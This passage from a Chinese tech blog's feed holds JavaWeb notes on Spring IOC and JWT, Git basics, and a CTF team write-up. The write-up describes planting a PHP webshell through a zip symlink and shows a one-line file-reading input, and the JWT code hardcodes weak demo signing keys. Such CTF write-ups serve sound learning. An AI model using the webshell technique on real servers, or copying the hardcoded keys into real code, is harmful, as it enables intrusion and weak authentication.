class="hljs-variable">job</span> <span class="hljs-operator">=</span> emp.getJob();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;讲师&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;2&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;3&quot;</span>.equals(job)) &#123;<br>                emp.setJob(<span class="hljs-string">&quot;班主任&quot;</span>);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> empList;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Dao（数据处理）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmpDaoA</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">EmpDao</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//1.加载解析xml</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getClassLoader().getResource(<span class="hljs-string">&quot;emp.xml&quot;</span>).getFile();<br>        System.out.println(file);<br>        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);<br>        <span class="hljs-keyword">return</span> empList;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Service和Dao层次：需要写一个接口，然后再写一个实现类，便于之后更新管理</p><p><img src="/img/JavaWeb/2-1/8.png"></p><p>Service接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">EmpService</span> &#123;<br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Dao接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">EmpDao</span> &#123;<br>    <span class="hljs-keyword">public</span> List&lt;Emp&gt; <span class="hljs-title function_">ListEmp</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三层架构前后对比</p><p><img src="/img/JavaWeb/2-1/9.png"></p><h3 id="3、分层解耦"><a href="#3、分层解耦" class="headerlink" title="3、分层解耦"></a>3、分层解耦</h3><p>控制反转：lnversion Of Control,简称IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转。<br>依赖注入：Dependency lnjection,简称DI。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入。<br>Bean对象：IOC容器中创建、管理的对象，称之为beano</p><p><img src="/img/JavaWeb/2-1/10.png"></p><p>IOC&amp;DI 入门</p><p>1.Service 层及 Dao 层的实现类交给IOC 容器管理 。</p><p>-&gt;Service 层及 Dao 层上加上注解@Component</p><p>2.为 Controller 及 Service 注入运行时，依赖的对象 。</p><p>-&gt;Service 层及 Dao 层上加上注解@Autowired</p><p>3.运行测试 。</p><p>4.切换实现类</p><p>将不需要的@Component注释掉</p><p><img src="/img/JavaWeb/2-1/11.png"></p><table><thead><tr><th>注释</th><th>说明</th><th>位置</th></tr></thead><tbody><tr><td>@Component</td><td>声明bean的基础注解</td><td>不属于以下三类时，用此注解</td></tr><tr><td>@Controller</td><td>@Component的衍生注解</td><td>标注在控制器类上</td></tr><tr><td>@Service</td><td>@Component的衍生注解</td><td>标注在业务类上</td></tr><tr><td>@Repository</td><td>@Component的衍生注解</td><td>标注在数据访问类上(由于与mybatis整合，用的少)</td></tr></tbody></table><p>声明bean的时候，可以通过value属性指定bean的名字, 如果没有指定，默认为类名首字母小写。</p><p>使用以上四个注解都可以声明bean,但是在springboot集成web开发中，声明控制器bean只能用@Controller。</p><h3 id="4、Bean组件扫描"><a href="#4、Bean组件扫描" class="headerlink" title="4、Bean组件扫描"></a>4、Bean组件扫描</h3><p>前面声明bean的四大注解，要想生效，还需要被组件扫描注解@ComponentScan扫描。</p><p>@ComponentScan注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解</p><p>@SpringBootApplication中，默认扫描的范围是启动类所在包及其子包。</p><p>@Autowired 注解，默认是按照类型进行，如果存在多个相同类型的bean，将会报出错误</p><p>通过以下几种方案来解决：</p><p>设置优先级：@Primary</p><p>指定类：@QuaIifier(“”)</p><p>@Resource(name = “”)</p><p>@Autowired是spring框架提供的注解，而@Resource是JDK提供的注解。</p><p>@Autowired默认是按照类型注入，而@Resource默认是按照名称注入。</p><h2 id="三、MySQL"><a href="#三、MySQL" class="headerlink" title="三、MySQL"></a>三、MySQL</h2><p>1、SQL语句通常被分为四大类：</p><table><thead><tr><th align="left">分类</th><th>全称</th><th>说明</th></tr></thead><tbody><tr><td align="left">DDL</td><td>Data Definition Language</td><td>数据定义语言，用来定义数据库对象(数据库，表，字段)</td></tr><tr><td align="left">DML</td><td>Data Manipulation Language</td><td>数据操作语言，用来对数据库表中的数据进行增删改</td></tr><tr><td align="left">DQL</td><td>Data Query Language</td><td>数据查询语言，用来查询数据库中表的记录</td></tr><tr><td align="left">DCL</td><td>Data Control Language</td><td>数据控制语言，用来创建数据库用户、控制数据库的访问权限</td></tr></tbody></table><h2 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h2><h4 id="1、文件上传三要数"><a href="#1、文件上传三要数" class="headerlink" title="1、文件上传三要数"></a>1、文件上传三要数</h4><p>method设置为post</p><p>enctype设置为multipart/form-data</p><p>type设置为file</p><p><img src="/img/JavaWeb/2-1/12.png"></p><h2 id="五、JWT"><a href="#五、JWT" class="headerlink" title="五、JWT"></a>五、JWT</h2><h3 id="1、JWT简介"><a href="#1、JWT简介" class="headerlink" title="1、JWT简介"></a>1、JWT简介</h3><p>全称：JSON Web Token</p><p>官网：<a href="https://jwt.io/">https://jwt.io/</a></p><p>定义了一种简洁的、自包含的格式,用于在通信双方以json数据格式安全的传输信息。由于数字签名的存在，这些信息是可靠的。</p><p>组成:<br>第一部分: Header(头)，记录令牌类型、签名算法等。例如: {“alg”:”HS256”,”type’ ‘:”WT”}<br>第二部分: Payload(有效载荷) ,携带一些自定义信息、 默认信息等。例如: {“id”:”I”,”username”:”Tom”}<br>第三部分: Signature(签名) ，防止Token被篡改、确保安全性。将header. payload, 并加入指定秘钥，通过指定签名算法计算而来。</p><p><img src="/img/JavaWeb/2-1/13.png"></p><p>场景:登录认证。<br>①登录成功后，生成令牌<br>②后续每个请求，都要携带JWT令牌，系统在每次请求处理之前，先校验令牌，通过后，再处理</p><p><img src="/img/JavaWeb/2-1/14.png"></p><p>创造一个JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testGenJwt</span><span class="hljs-params">()</span> &#123;<br>        Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        claims.put(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-number">1</span>);<br>        claims.put(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;tom&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> Jwts.builder()<br>                .signWith(SignatureAlgorithm.HS256,<span class="hljs-string">&quot;itheimaitheimaitheimaitheimaitheimaitheimaitheimaitheima&quot;</span>)<br>                .setClaims(claims)<br>                .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()+ <span class="hljs-number">3600</span> * <span class="hljs-number">1000</span>))<br>                .compact();<br>        System.out.println(jwt);<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>解析上面的JWT</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testParseHwt</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.parser()<br>            .setSigningKey(<span class="hljs-string">&quot;itheimaitheimaitheimaitheimaitheimaitheimaitheimaitheima&quot;</span>)<br>            .parseClaimsJws(<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoidG9tIiwiaWQiOjEsImV4cCI6MTY4NTUxODc1OX0.G-3TTiHeKaCvdv_l7qGS_pSOtwt0lPBEe95d4cGQPyQ\n&quot;</span>)<br>            .getBody();<br>    System.out.println(claims);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>JWT过期之后失效无法解析</p><h3 id="2、JWT实例"><a href="#2、JWT实例" class="headerlink" title="2、JWT实例"></a>2、JWT实例</h3><p>JWTUtils工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtUtils</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">signKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;itheima&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Long</span> <span class="hljs-variable">expire</span> <span class="hljs-operator">=</span> <span class="hljs-number">43200000L</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> claims JWT第二部分负载 payload 中存储的内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateJwt</span><span class="hljs-params">(Map&lt;String, Object&gt; claims)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> Jwts.builder()<br>                .addClaims(claims)<br>                .signWith(SignatureAlgorithm.HS256, signKey)<br>                .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expire))<br>                .compact();<br>        <span class="hljs-keyword">return</span> jwt;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 解析JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> jwt JWT令牌</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JWT第二部分负载 payload 中存储的内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Claims <span class="hljs-title function_">parseJWT</span><span class="hljs-params">(String jwt)</span>&#123;<br>        <span class="hljs-type">Claims</span> <span class="hljs-variable">claims</span> <span class="hljs-operator">=</span> Jwts.parser()<br>                .setSigningKey(signKey)<br>                .parseClaimsJws(jwt)<br>                .getBody();<br>        <span class="hljs-keyword">return</span> claims;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>实现登录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> EmpService empService;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Emp emp)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;员工登录: &#123;&#125;&quot;</span>, emp);<br>        <span class="hljs-type">Emp</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> empService.login(emp);<br><br>        <span class="hljs-comment">//登录成功,生成令牌,下发令牌</span><br>        <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>)&#123;<br>            Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            claims.put(<span class="hljs-string">&quot;id&quot;</span>, e.getId());<br>            claims.put(<span class="hljs-string">&quot;name&quot;</span>, e.getName());<br>            claims.put(<span class="hljs-string">&quot;username&quot;</span>, e.getUsername());<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> JwtUtils.generateJwt(claims); <span class="hljs-comment">//jwt包含了当前登录的员工信息</span><br>            <span class="hljs-keyword">return</span> Result.success(jwt);<br>        &#125;<br><br>        <span class="hljs-comment">//登录失败, 返回错误信息</span><br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF周报-2223Q2-Week10</title>
    <link href="/2023/05/29/CTF-2223Q2-Week15/"/>
    <url>/2023/05/29/CTF-2223Q2-Week15/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF国赛-L3tS4fe战队WRITEUP</title>
    <link href="/2023/05/28/CTF_com_1/"/>
    <url>/2023/05/28/CTF_com_1/</url>
    
    <content type="html"><![CDATA[<h1 id="L3tS4fe战队WRITEUP"><a href="#L3tS4fe战队WRITEUP" class="headerlink" title="L3tS4fe战队WRITEUP"></a>L3tS4fe战队WRITEUP</h1><h2 id="一、-战队信息"><a href="#一、-战队信息" class="headerlink" title="一、 战队信息"></a>一、 战队信息</h2><p>战队名称：L3tS4fe</p><p>战队排名：700</p><h2 id="二、-解题情况"><a href="#二、-解题情况" class="headerlink" title="二、 解题情况"></a>二、 解题情况</h2><p><img src="/img/CTF/com_1/com-1.png"></p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><p>linux下建立一个软连接文件指向/var/www/html，这作为第一个zip文件压缩。</p><p>第二个压缩包，先创建一个test目录，在test目录下写一个shell文件cmd.php，此时压缩包目录架构是：test/cmd.php</p><p>访问cmd.php，输入执行的指令，获得flag</p><h3 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h3><p>输入指令print(open(‘/flag’).read())</p><p>flag{06c7b3f2-5ba7-4c40-a161-13348cc57223}</p><h3 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h3><p>在文件中找到网站，打开网站解析文件。</p><p>然后发现一个加密的流程，打开加密流程，分析过程。</p><p>在secret模块中，添加一个打印模块，记录下所有数据。</p><p>根据后续的代码，编写一个解密异或代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> a[] = &#123;<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>&#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">42</span>; i++) &#123;<br>        a[i] = a[i] ^ a[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功获得flag</p><p>flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p><h3 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h3><p>在流量中找到一串前面相同，最后2位不同的字符，发现最后以=结束，将其全部连接起来，用base16解析，成功获得flag</p><p><img src="/img/CTF/com_1/com-2.png"></p><h3 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h3><p><img src="/img/CTF/com_1/com-3.png"></p><p><img src="/img/CTF/com_1/com-4.png"><br>看到ctf数据库和flag1表，查查看<br><img src="/img/CTF/com_1/com-5.png"><br>fake_flag<br><img src="/img/CTF/com_1/com-6.png"><br>不在mysql里</p><p>于是看打印出来的日志<br><img src="/img/CTF/com_1/com-7.png"></p><p><img src="/img/CTF/com_1/com-8.png"><br>没发现什么有用的信息<br>但题目是dumpit，应该就在里面找<br>试了半天想到docker的env可能有没删除的flag，于是<br><img src="/img/CTF/com_1/com-9.png"><br>找到flag（这应该是非预期解，预期解是命令执行吧。。。)</p><h3 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h3><p>首先打开文件得到</p><p><img src="/img/CTF/com_1/com-10.png"></p><p>猜测第一行是base64加密，但解出来不对，所以猜测是换表加密，第二行是url加密，解密第二行得到</p><p>GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5</p><p>换表解密得到flag</p><p><img src="/img/CTF/com_1/com-11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git知识与使用-1</title>
    <link href="/2023/05/25/Git_1/"/>
    <url>/2023/05/25/Git_1/</url>
    
    <content type="html"><![CDATA[<h1 id="Git知识与使用-1"><a href="#Git知识与使用-1" class="headerlink" title="Git知识与使用-1"></a>Git知识与使用-1</h1><h2 id="一、Git基础知识"><a href="#一、Git基础知识" class="headerlink" title="一、Git基础知识"></a>一、Git基础知识</h2><h3 id="1、Git的工作流程"><a href="#1、Git的工作流程" class="headerlink" title="1、Git的工作流程"></a>1、Git的工作流程</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Git</span>是分布式版本控制系统（<span class="hljs-built_in">Distributed</span> <span class="hljs-built_in">Version</span> <span class="hljs-built_in">Control</span> <span class="hljs-variable">System</span>，简称 <span class="hljs-variable">DVCS</span>），分为两种类型的仓库：<br>本地仓库和远程仓库<br>工作流程如下<br>    <span class="hljs-number">1</span>．从远程仓库中克隆或拉取代码到本地仓库<span class="hljs-punctuation">(</span><span class="hljs-variable">clone</span><span class="hljs-operator">/</span><span class="hljs-variable">pull</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-number">2</span>．从本地进行代码修改<br>    <span class="hljs-number">3</span>．在提交前先将代码提交到暂存区<br>    <span class="hljs-number">4</span>．提交到本地仓库。本地仓库中保存修改的各个历史版本<br>    <span class="hljs-number">5</span>．修改完成后，需要和团队成员共享代码时，将代码<span class="hljs-variable">push</span>到远程仓库<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/git.png"></p><p>总结:git和svn的区别</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> svn 是集中式版本控制工具,git 是分布式版本控制工具<br><span class="hljs-bullet">2.</span> svn 不支持离线提交,git 支持离线提交代码<br></code></pre></td></tr></table></figure><h3 id="2、Git-的安装下载"><a href="#2、Git-的安装下载" class="headerlink" title="2、Git 的安装下载"></a>2、Git 的安装下载</h3><p>下载地址： <a href="https://git-scm.com/download">https://git-scm.com/download</a></p><h2 id="二、Git-工作流程"><a href="#二、Git-工作流程" class="headerlink" title="二、Git 工作流程"></a>二、Git 工作流程</h2><h3 id="1、Git流程图"><a href="#1、Git流程图" class="headerlink" title="1、Git流程图"></a>1、Git流程图</h3><p><img src="/img/Git/1/git%E6%B5%81%E7%A8%8B.png"></p><p>概念即详解</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">本地仓库：是在开发人员自己电脑上的Git仓库,存放我们的代码(.git 隐藏文件夹就是我们的本地仓库)<br>远程仓库：是在远程服务器上的Git仓库,存放代码(可以是github.com或者gitee.com 上的仓库,或者自己该公司的服务器)<br>工作区: 我们自己写代码(文档)的地方<br><span class="hljs-section">暂存区: 在 本地仓库中的一个特殊的文件(index) 叫做暂存区,临时存储我们即将要提交的文件</span><br><span class="hljs-section">------------</span><br>Clone：克隆，就是将远程仓库复制到本地仓库<br>Push：推送，就是将本地仓库代码上传到远程仓库<br>Pull：拉取，就是将远程仓库代码下载到本地仓库,并将代码 克隆到本地工作区<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/git%E6%B5%81%E7%A8%8B_%E8%AF%A6%E8%A7%A3.png"></p><p>文件状态讲解</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Git</span>工作目录下的文件存在两种状态：<br><span class="hljs-attribute">1</span> untracked 未跟踪（未被纳入版本控制） :  比如新建的文件(此时文件夹上没有图标或者有一个<span class="hljs-string">&quot;问号&quot;</span>)<br><span class="hljs-attribute">2</span> tracked 已跟踪（被纳入版本控制）     <br>    <span class="hljs-attribute">2</span>.<span class="hljs-number">1</span> Staged 已暂存状态            : 添加 但未提交状态(此时文件夹上有一个<span class="hljs-string">&quot;加号&quot;</span>)<br><span class="hljs-attribute">2</span>.<span class="hljs-number">2</span> Unmodified 未修改状态        : 已提交(此时文件夹上有一个<span class="hljs-string">&quot;对号&quot;</span>)<br><span class="hljs-attribute">2</span>.<span class="hljs-number">3</span> Modified 已修改状态          : 修改了,但是还没有提交 (此时文件夹上有一个<span class="hljs-string">&quot;红色感叹号&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="2、分支"><a href="#2、分支" class="headerlink" title="2、分支"></a>2、分支</h3><p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来，避免影响开发主线。多线程开发,可以同时开启多个任务的开发,多个任务之间互不影响.</p><p>为何要使用分支：</p><p>先看单线程开发</p><p><img src="/img/Git/1/1572173978185.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gcode">思考如下现象<br>    <span class="hljs-number">10.1</span> 日 业务部门提出需求 : 明年 元旦<span class="hljs-number">3</span>天做<span class="hljs-number">2</span>个促销活动<br><span class="hljs-number">1</span>) <span class="hljs-number">12.31</span> 号上线活动<span class="hljs-number">1</span>, <br><span class="hljs-number">2</span>) <span class="hljs-number">1.4</span> 号上线活动<span class="hljs-number">2</span> ,同时 要求撤销 活动<span class="hljs-number">1</span><br>    你所在部门领导为了保证能顺利完成,要求 <span class="hljs-number">11.15</span> 号完成上述连个功能的开发工作<br>此时作为开发人员:我要面临两个文件, 活动<span class="hljs-number">1</span> 的代码,即要存在<span class="hljs-comment">(12.31 要用)</span>又要不存在<span class="hljs-comment">(1.4 号要求删除)</span>,我们怎么做?<br>显然比较棘手,如果使用分支<span class="hljs-comment">(可以理解为将代码复制一份)</span>将很好解决<br></code></pre></td></tr></table></figure><p><img src="/img/Git/1/1572174740013.png"></p><h3 id="3、标签"><a href="#3、标签" class="headerlink" title="3、标签"></a>3、标签</h3><p>如果你的项目达到一个重要的阶段，并希望永远记住那个特别的提交快照，你可以给它打上标签(tag)<br>比如说，我们想为我们的项目发布一个”1.0”版本。 我们给最新一次提交打上（HEAD）”v1.0”的标签。<br>标签可以理解为项目里程碑的一个标记,一旦打上了这个标记则,表示当前的代码将不允许提交</p><h2 id="三、Git的连接与配置"><a href="#三、Git的连接与配置" class="headerlink" title="三、Git的连接与配置"></a>三、Git的连接与配置</h2><h3 id="1、SSH连接概述"><a href="#1、SSH连接概述" class="headerlink" title="1、SSH连接概述"></a>1、SSH连接概述</h3><p>实际上git 不仅仅支持用户名密码方式的配置,可以有另外一种相对更加安全的配置即ssh方式配置</p><p>ssh方式的底层原理：</p><p>ssh连接地城是RAS加密算法,又称非对称加密,是一种现在公认的最安全的加密方式<br>数学基础好的同学可以研究一下<br><a 